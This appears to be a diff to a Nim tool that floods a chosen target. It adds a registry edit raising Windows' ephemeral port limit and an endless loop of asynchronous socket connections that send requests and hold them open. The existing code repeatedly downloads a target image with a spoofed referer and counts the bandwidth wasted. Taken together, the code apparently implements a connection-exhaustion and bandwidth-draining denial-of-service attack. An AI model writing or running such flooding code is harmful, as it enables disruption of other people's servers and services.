@@ -1,4 +1,29 @@
-import asynchttpserver, strutils, httpclient, threadpool, json, asyncdispatch, net, os, halonium
+import asynchttpserver, strutils, httpclient, threadpool, json, asyncdispatch, net, os, halonium, random, winregistry, asyncdispatch, asyncnet
+
+proc winFix(enable: bool): void =
+  var
+    h: RegHandle
+  try:
+    h = open("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", samWrite)
+    h.writeInt32("MaxUserPort",65535)
+  except OSError:
+    echo "err: ", getCurrentExceptionMsg()
+  finally:
+    close(h)
+
+proc SessionGrb(target: string, port: Port, delay: int, log = false) {.async.} =
+  var socket = newAsyncSocket()
+  var socketu = newSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+  try:
+    await socket.connect(target, port)
+    socketu.connect(target, port)
+    if log == true:
+      echo "Connected to " & target & ":" & intToStr(int(port))
+    await socket.send("GET / HTTP/1.1\r\nHost: " & target & "\r\n\r\n")
+    await sleepAsync(delay)
+    socket.close()
+  except:
+    echo "Connection to " & target & ":" & intToStr(int(port)) & " failed: " & getCurrentExceptionMsg()
 
 var imInFight: bool = false
 
@@ -63,17 +88,11 @@ proc imgGrb(conType: string, target: string, targetImg: string, userAgent: strin
       echo "An error occurred: ", e.msg
     return false
 
-proc sessionGrb(target: string, port: int32, timeout = 1000, log = false) {.async.} =
-  var socket = newSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
-  try:
-    socket.connect(target, Port(port))
-    if log == true:
-      echo "Connected to ", target, ":", port
-    await sleepAsync(timeout)
-  except:
-    discard
+proc SessionGrbWait(target: string, port: Port, del1 = 5000, del2 = 15000, log = false): void =
+  while true:
+    var delay = rand(del1..del2)
+    asyncCheck SessionGrb(target, port, delay, log = log)
 
-#[
 var
   bitRange: int32 = 290235
   bitWast = 0
@@ -87,8 +106,9 @@ var
   cookieInject = ""
   filePth = "C:/\"Program Files (x86)/Mozilla Firefox\"/firefox.exe" #in winDUSE lol
 
+#[
+spawn SessionGrbWait(target, Port(port), log = true)
 while true:
-  discard spawn sessionGrb(target, port, range, log = true)
   var outPass = spawn imgGrb(conType, target, targetImg, userAgent, bitRange, "https://duckduckgo.com/", cookieInject)
   if ^outPass == true:
     bitWast += bitRange
@@ -113,4 +133,5 @@ while true:
           userAgent = userInput
       elif userInput == "n":
         discard
+runForever()
 ]#
